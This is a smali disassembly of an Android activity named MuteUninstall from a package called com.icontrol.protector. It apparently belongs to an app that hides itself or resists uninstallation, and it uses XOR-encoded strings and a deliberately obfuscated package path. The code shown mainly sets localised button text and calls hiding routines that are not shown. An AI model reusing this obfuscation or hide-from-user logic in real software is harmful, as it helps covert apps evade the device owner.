.class public Lcom/icontrol/protector/MuteUninstall;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "SourceFile"


# static fields
.field private static A:Z = false


# instance fields
.field private y:Landroid/widget/Button;

.field private z:Landroid/widget/TextView;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method public static synthetic Q(Lcom/icontrol/protector/MuteUninstall;Landroid/view/View;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/MuteUninstall;->R(Landroid/view/View;)V

    return-void
.end method

.method private synthetic R(Landroid/view/View;)V
    .locals 5

    .line 1
    sget-object p1, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    const/4 v0, 0x1

    new-array v1, v0, [B

    const/16 v2, -0x3e

    const/4 v3, 0x0

    aput-byte v2, v1, v3

    const/16 v2, 0x8

    new-array v4, v2, [B

    fill-array-data v4, :array_0

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_0

    sget-object p1, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    new-array v0, v0, [B

    const/4 v1, -0x5

    aput-byte v1, v0, v3

    new-array v1, v2, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    :cond_0
    invoke-static {}, Lcom/icontrol/protector/a;->G()[B

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x5ft
        -0x73t
        0x4dt
        -0x1bt
        -0x51t
        0x65t
        -0x58t
        0x14t
    .end array-data

    :array_1
    .array-data 1
        -0x70t
        0x5t
        0x77t
        -0x42t
        -0x2ft
        -0x43t
        -0x19t
        -0x49t
    .end array-data
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    invoke-super {p0, p1}, Landroidx/fragment/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->q:I

    invoke-virtual {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->setContentView(I)V

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->b:I

    invoke-virtual {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iput-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->m:I

    invoke-virtual {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    iput-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/16 v1, 0xd37

    const/4 v2, 0x1

    const/4 v3, 0x4

    const/4 v4, 0x3

    const/4 v5, 0x5

    const/4 v6, 0x2

    const/16 v7, 0x8

    if-eq v0, v1, :cond_5

    const/16 v1, 0xd64

    if-eq v0, v1, :cond_4

    const/16 v1, 0xe04

    if-eq v0, v1, :cond_3

    const/16 v1, 0xe43

    if-eq v0, v1, :cond_2

    const/16 v1, 0xe7e

    if-eq v0, v1, :cond_1

    const/16 v1, 0xf2e

    if-eq v0, v1, :cond_0

    goto/16 :goto_0

    :cond_0
    new-array v0, v6, [B

    fill-array-data v0, :array_0

    new-array v1, v7, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    const/4 p1, 0x0

    goto/16 :goto_1

    :cond_1
    new-array v0, v6, [B

    fill-array-data v0, :array_2

    new-array v1, v7, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    move p1, v5

    goto :goto_1

    :cond_2
    new-array v0, v6, [B

    fill-array-data v0, :array_4

    new-array v1, v7, [B

    fill-array-data v1, :array_5

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    move p1, v4

    goto :goto_1

    :cond_3
    new-array v0, v6, [B

    fill-array-data v0, :array_6

    new-array v1, v7, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    move p1, v3

    goto :goto_1

    :cond_4
    new-array v0, v6, [B

    fill-array-data v0, :array_8

    new-array v1, v7, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    move p1, v6

    goto :goto_1

    :cond_5
    new-array v0, v6, [B

    fill-array-data v0, :array_a

    new-array v1, v7, [B

    fill-array-data v1, :array_b

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    move p1, v2

    goto :goto_1

    :cond_6
    :goto_0
    const/4 p1, -0x1

    :goto_1
    const/4 v0, 0x6

    if-eqz p1, :cond_c

    const/16 v1, 0x2d

    const/16 v8, 0x18

    if-eq p1, v2, :cond_b

    if-eq p1, v6, :cond_a

    if-eq p1, v4, :cond_9

    if-eq p1, v3, :cond_8

    if-eq p1, v5, :cond_7

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v1, v7, [B

    fill-array-data v1, :array_d

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    const/16 v0, 0x1b

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v7, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_2
    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_3

    :cond_7
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    const/4 v0, 0x7

    new-array v0, v0, [B

    fill-array-data v0, :array_10

    new-array v1, v7, [B

    fill-array-data v1, :array_11

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    new-array v0, v8, [B

    fill-array-data v0, :array_12

    new-array v1, v7, [B

    fill-array-data v1, :array_13

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_8
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_14

    new-array v1, v7, [B

    fill-array-data v1, :array_15

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    const/16 v0, 0x20

    new-array v0, v0, [B

    fill-array-data v0, :array_16

    new-array v1, v7, [B

    fill-array-data v1, :array_17

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_9
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    const/16 v0, 0xe

    new-array v0, v0, [B

    fill-array-data v0, :array_18

    new-array v1, v7, [B

    fill-array-data v1, :array_19

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    const/16 v0, 0x34

    new-array v0, v0, [B

    fill-array-data v0, :array_1a

    new-array v1, v7, [B

    fill-array-data v1, :array_1b

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_a
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    new-array v0, v0, [B

    fill-array-data v0, :array_1c

    new-array v2, v7, [B

    fill-array-data v2, :array_1d

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    new-array v0, v1, [B

    fill-array-data v0, :array_1e

    new-array v1, v7, [B

    fill-array-data v1, :array_1f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    :cond_b
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    new-array v0, v8, [B

    fill-array-data v0, :array_20

    new-array v2, v7, [B

    fill-array-data v2, :array_21

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    new-array v0, v1, [B

    fill-array-data v0, :array_22

    new-array v1, v7, [B

    fill-array-data v1, :array_23

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    :cond_c
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    new-array v0, v0, [B

    fill-array-data v0, :array_24

    new-array v1, v7, [B

    fill-array-data v1, :array_25

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->z:Landroid/widget/TextView;

    const/16 v0, 0x15

    new-array v0, v0, [B

    fill-array-data v0, :array_26

    new-array v1, v7, [B

    fill-array-data v1, :array_27

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    :goto_3
    iget-object p1, p0, Lcom/icontrol/protector/MuteUninstall;->y:Landroid/widget/Button;

    if-eqz p1, :cond_d

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cv;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cv;-><init>(Lcom/icontrol/protector/MuteUninstall;)V

    invoke-virtual {p1, v0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :cond_d
    return-void

    nop

    :array_0
    .array-data 1
        0x0t
        -0x78t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x7at
        -0x20t
        0x7et
        0x4ct
        -0x6t
        -0x6ft
        0x6ft
        -0x79t
    .end array-data

    :array_2
    .array-data 1
        -0x56t
        0x3bt
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x22t
        0x49t
        0x55t
        -0x7at
        0x4at
        0x61t
        -0x25t
        0x55t
    .end array-data

    :array_4
    .array-data 1
        -0x12t
        -0xft
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x64t
        -0x7ct
        0x6bt
        0x6t
        -0x4dt
        -0x1et
        -0x3ft
        -0x6at
    .end array-data

    :array_6
    .array-data 1
        0x39t
        0x45t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x49t
        0x31t
        0x75t
        -0x4dt
        -0x1at
        0x14t
        -0x5t
        0x43t
    .end array-data

    :array_8
    .array-data 1
        -0x43t
        0x7ct
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x2at
        0x13t
        0x2dt
        0x12t
        0x40t
        0x6dt
        0x12t
        -0x62t
    .end array-data

    :array_a
    .array-data 1
        -0x6bt
        0x4ft
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x1t
        0x2et
        -0x2bt
        -0x20t
        0x3bt
        -0x48t
        0x40t
        -0x3ct
    .end array-data

    :array_c
    .array-data 1
        -0x71t
        0x6t
        0x52t
        -0x33t
        -0x3ct
        -0x6at
        -0x6et
        0x28t
        -0x4at
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x26t
        0x68t
        0x3bt
        -0x5dt
        -0x49t
        -0x1et
        -0xdt
        0x44t
    .end array-data

    :array_e
    .array-data 1
        0x61t
        0x3t
        -0x7ct
        -0x5at
        -0x43t
        -0x56t
        0x21t
        -0x56t
        0x57t
        0x8t
        -0x7ct
        -0x45t
        -0x49t
        -0x57t
        0x21t
        -0x4bt
        0x5ct
        0x19t
        -0x68t
        -0x41t
        -0x58t
        -0x5at
        0x75t
        -0x4bt
        0x50t
        0x16t
        -0x6et
    .end array-data

    :array_f
    .array-data 1
        0x32t
        0x7at
        -0x9t
        -0x2et
        -0x28t
        -0x39t
        0x1t
        -0x24t
    .end array-data

    :array_10
    .array-data 1
        -0x49t
        0x49t
        -0x1at
        0x53t
        -0x22t
        -0x74t
        0x12t
    .end array-data

    :array_11
    .array-data 1
        -0x4t
        0x28t
        -0x76t
        0x37t
        0x1at
        0x3dt
        0x60t
        0x47t
    .end array-data

    :array_12
    .array-data 1
        0x3at
        0x78t
        0x24t
        0x20t
        -0x71t
        -0x57t
        0x6dt
        -0x68t
        -0x56t
        -0x53t
        0x25t
        -0x69t
        0x56t
        -0x57t
        -0x72t
        0x57t
        0x49t
        0x64t
        0x2et
        0x21t
        -0x79t
        -0x49t
        0x38t
        -0x6ft
    .end array-data

    :array_13
    .array-data 1
        0x69t
        0x11t
        0x57t
        0x54t
        -0x16t
        -0x3ct
        0x4dt
        -0x15t
    .end array-data

    :array_14
    .array-data 1
        -0x44t
        0x17t
        0x67t
        -0x29t
        0x5ft
        -0x35t
        0x24t
        -0x47t
        -0x6ct
        0x13t
        0x66t
    .end array-data

    :array_15
    .array-data 1
        -0x8t
        0x72t
        0x14t
        -0x42t
        0x31t
        -0x48t
        0x50t
        -0x28t
    .end array-data

    :array_16
    .array-data 1
        -0x7ft
        0x4t
        -0x38t
        0x19t
        -0x55t
        -0x4bt
        0x64t
        0xet
        -0x4dt
        0xet
        -0x66t
        0x19t
        0x1t
        0x65t
        0x7ft
        0x4bt
        -0x46t
        0x0t
        -0x66t
        0x3t
        0x6t
        0x75t
        0x64t
        0x43t
        -0x59t
        0x0t
        -0x32t
        -0x57t
        -0x3bt
        0x60t
        0x6et
        0x42t
    .end array-data

    :array_17
    .array-data 1
        -0x29t
        0x61t
        -0x46t
        0x6at
        0x68t
        0x16t
        0xbt
        0x2et
    .end array-data

    :array_18
    .array-data 1
        0x28t
        0x24t
        0x64t
        0x30t
        -0x31t
        0x2at
        -0x80t
        0x25t
        0x28t
        0x3ft
        0x65t
        0x6t
        -0x32t
        0x16t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0x8t
        -0x79t
        -0x4ct
        -0x7ct
        0x1ft
        -0x66t
        0x50t
        -0x62t
    .end array-data

    :array_1a
    .array-data 1
        -0x7ft
        0x34t
        0x0t
        0x55t
        0x5ct
        -0x71t
        0x11t
        0x1t
        -0x7ft
        0x1et
        0x1t
        0x6ft
        -0x53t
        -0x22t
        0x41t
        0x50t
        -0x17t
        0x77t
        0x51t
        0x31t
        0xft
        -0x21t
        0x75t
        0x50t
        -0x13t
        0x77t
        0x5bt
        -0x40t
        0x5dt
        -0x4et
        0x10t
        0x35t
        -0x80t
        0x27t
        0x0t
        0x5et
        0x5dt
        -0x43t
        0x10t
        0x3ct
        -0x7ft
        0x13t
        0x1t
        0x61t
        0x5ct
        -0x73t
        0x10t
        0x38t
        -0x7ft
        0x1at
        0x0t
        0x50t
    .end array-data

    :array_1b
    .array-data 1
        0x51t
        -0x5at
        -0x30t
        -0x20t
        -0x73t
        0xft
        -0x40t
        -0x80t
    .end array-data

    :array_1c
    .array-data 1
        -0x18t
        0x2et
        0x20t
        0x7dt
        -0x21t
        -0x5et
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x4t
        -0x72t
        -0x44t
        -0x69t
        0x6et
        0x12t
        -0x1ft
        -0x60t
    .end array-data

    :array_1e
    .array-data 1
        0x6dt
        -0x68t
        -0x61t
        -0x1et
        -0x1et
        -0x34t
        -0x19t
        -0x3et
        0x1dt
        0x33t
        -0x18t
        -0x44t
        -0x14t
        -0x7ct
        -0x56t
        -0x3dt
        0x6dt
        -0x72t
        -0x49t
        0x2et
        -0x7bt
        -0x10t
        -0x4et
        -0x56t
        0x18t
        -0x75t
        -0x18t
        -0x62t
        -0x10t
        -0x7ct
        -0x53t
        -0x39t
        -0x5ft
        -0x1t
        -0x6at
        -0x7ct
        -0x7ct
        -0x1et
        -0x41t
        -0x54t
        0xat
        -0x65t
        -0x18t
        -0x7bt
        -0x34t
    .end array-data

    nop

    :array_1f
    .array-data 1
        -0x7ft
        0x13t
        0x3t
        0xet
        0x68t
        0x68t
        0xat
        0x47t
    .end array-data

    :array_20
    .array-data 1
        0x11t
        0x41t
        0x4dt
        -0x5at
        0x4bt
        -0x50t
        0x5t
        0x40t
        0x56t
        0x20t
        0x6ct
        -0xat
        0x2bt
        -0x7ft
        0x5ft
        0x21t
        0x71t
        0x4bt
        0xct
        -0x3at
        0x74t
        -0x20t
        0x65t
        0x69t
    .end array-data

    :array_21
    .array-data 1
        -0xet
        -0x3dt
        -0x11t
        0x45t
        -0x38t
        0x3t
        -0x1at
        -0x3et
    .end array-data

    :array_22
    .array-data 1
        -0x71t
        0x53t
        -0x5t
        -0x40t
        0x39t
        0x18t
        0x16t
        -0x56t
        -0x16t
        0x32t
        -0x31t
        -0x7dt
        0x58t
        0x22t
        0x65t
        -0x36t
        -0x11t
        0x6dt
        -0x51t
        -0x5ft
        0x3t
        0x42t
        0x76t
        -0x72t
        -0x71t
        0x52t
        -0x1t
        -0x40t
        0x3at
        0x2dt
        0x1ct
        -0x4ct
        -0xet
        0x34t
        -0x1dt
        -0x63t
        0x5et
        0x1et
        0x69t
        -0x36t
        -0x13t
        0x76t
        -0x51t
        -0x5et
        0x22t
    .end array-data

    nop

    :array_23
    .array-data 1
        0x6ct
        -0x2ft
        0x4ct
        0x23t
        -0x45t
        -0x5ft
        -0xbt
        0x29t
    .end array-data

    :array_24
    .array-data 1
        -0x6at
        -0x16t
        -0x68t
        -0x2et
        -0x7bt
        0x62t
    .end array-data

    nop

    :array_25
    .array-data 1
        0x73t
        0x67t
        0x20t
        0x3at
        0x38t
        -0x21t
        0x3ct
        0x55t
    .end array-data

    :array_26
    .array-data 1
        0x44t
        0x54t
        -0x6et
        0xdt
        0x4dt
        0x2bt
        0x68t
        -0x45t
        0x2bt
        0x1t
        -0x4bt
        0x46t
        0x12t
        0xct
        0x2t
        -0x29t
        0x26t
        0x5bt
        -0x34t
        0x44t
        0x4ft
    .end array-data

    nop

    :array_27
    .array-data 1
        -0x5dt
        -0x19t
        0x29t
        -0x16t
        -0xat
        -0x4ct
        -0x71t
        0x32t
    .end array-data
.end method

.method protected onPause()V
    .locals 6

    invoke-super {p0}, Landroidx/fragment/app/FragmentActivity;->onPause()V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/icontrol/protector/MuteUninstall;->A:Z

    sget-object v1, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, 0xc

    aput-byte v4, v3, v0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    sget-object v1, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    new-array v2, v2, [B

    const/16 v3, 0x4f

    aput-byte v3, v2, v0

    new-array v0, v4, [B

    fill-array-data v0, :array_1

    invoke-static {v2, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    invoke-static {}, Lcom/icontrol/protector/a;->G()[B

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    nop

    :array_0
    .array-data 1
        0x6ft
        0x39t
        0x6at
        0x4dt
        0xat
        -0x3dt
        0x4ft
        0x2ft
    .end array-data

    :array_1
    .array-data 1
        0x24t
        0x66t
        -0x1at
        -0x32t
        -0x42t
        0xct
        -0x5t
        0x71t
    .end array-data
.end method

.method protected onResume()V
    .locals 1

    invoke-super {p0}, Landroidx/fragment/app/FragmentActivity;->onResume()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/MuteUninstall;->A:Z

    return-void
.end method
